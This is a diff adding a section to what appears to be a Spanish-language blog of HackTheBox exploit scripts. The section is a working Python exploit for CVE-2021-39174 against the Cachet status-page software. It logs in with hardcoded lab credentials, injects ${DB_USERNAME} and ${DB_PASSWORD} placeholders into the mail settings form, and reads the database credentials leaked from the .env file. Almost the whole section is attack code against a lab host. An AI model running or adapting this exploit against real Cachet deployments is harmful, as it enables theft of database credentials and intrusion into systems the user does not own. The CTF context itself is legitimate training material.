@@ -1,6 +1,107 @@
 ---
 layout: content
 ---
+
+<p> </p>
+
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Catch - HackTheBox</h2>
+
+Este *Script* abusa del CVE-2021-39174 para filtrar los valores de entrada de configuracion: nombres de usuario: `${DB_USERNAME}` y contraseña: `${DB_PASSWORD}` del archivo `.env` a través de un *input*.
+
+* Misconfiguration
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+from requests import get, post, Session
+import signal 
+from sys import exit
+from re import findall
+from bs4 import BeautifulSoup
+from pexpect import pxssh 
+
+# User: john
+# Password: E}V!mywu_69T4C}W
+
+def def_handler(sig,frame):
+    print('\nSaliendo...\n')
+    exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+burp = {'http':'http://127.0.0.1:8080'}
+
+s = Session()
+
+class Exploit():
+    def __init__(self, url, user, password, env_username, env_password):
+        self.__url = url
+        self.__user = user
+        self.__password = password
+        self.__env_user = env_username
+        self.__env_pass = env_password
+        
+    def login(self):
+        p1 = log.progress('Login')
+
+        global csrf_token
+        r = s.get(self.__url+'/auth/login')
+        csrf_token = findall(r'<meta name="token" content="(.*?)">', r.text)[0]
+        
+        post_data = {
+            '_token': csrf_token,
+            'username': self.__user,
+            'password': self.__password,
+            'remember_me': 0
+        }
+
+        try:
+            r = s.post(self.__url+'/auth/login', data=post_data, timeout=20)
+            p1.success('✔')
+        except Exception as e:
+            p1.failure('✘')
+            exit(1)
+
+    def read_env(self):
+        p2 = log.progress('User')
+        p3 = log.progress('Password')
+
+        post_data = {
+            '_token': (None, csrf_token),
+            'config[mail_driver]': (None, ''),
+            'config[mail_host]': (None, ''),
+            'config[mail_address]': (None, self.__env_user+':'+self.__env_pass),
+            'config[mail_username]': (None, ''),
+            'config[mail_password]': (None, '')
+        }
+
+        try:
+            r = s.post(self.__url+'/dashboard/settings/mail', files=post_data)
+            sleep(2)  
+            r = s.get(self.__url+'/dashboard/settings/mail')
+            
+            soup = BeautifulSoup(r.text, "html.parser")
+            payload_response = soup.find("input", {"placeholder": "notifications@alt-three.com"})["value"]
+            
+            p2.success(payload_response[0:4])
+            p3.success(payload_response[5:16])
+
+        except Exception as e:
+            p2.failure('✘')
+            p3.failure('✘')
+            exit(1)
+
+autopwn = Exploit('http://catch.htb:8000', 'john', 'E}V!mywu_69T4C}W', '${DB_USERNAME}', '${DB_PASSWORD}')
+
+def main():
+    autopwn.login()
+    autopwn.read_env()
+
+if __name__ == '__main__':
+    main()
+```
+
 <p> </p>
 
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Altered - HackTheBox</h2>
